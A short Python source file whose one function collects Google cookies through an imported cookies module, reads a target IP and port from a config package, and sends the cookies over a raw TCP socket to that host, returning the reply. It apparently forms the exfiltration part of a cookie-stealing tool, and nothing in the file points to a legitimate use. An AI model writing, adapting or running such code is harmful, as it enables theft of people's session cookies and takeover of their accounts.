import socket
from cookies import *
from ConfigPackage import *

def sendCookies():
    cookie = googlecookies.getcookies()
    RC = ReadConf.RConf("./ConfigPackage/")
    IP = RC.getIP()
    PORT = RC.getPORT()
    Socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    Socket.connect((IP,PORT))
    Socket.sendall(str(cookie).encode())
    data = Socket.recv(1024)
    data = data.decode()
    Socket.sendall("ok".encode())
    Socket.close()
    return data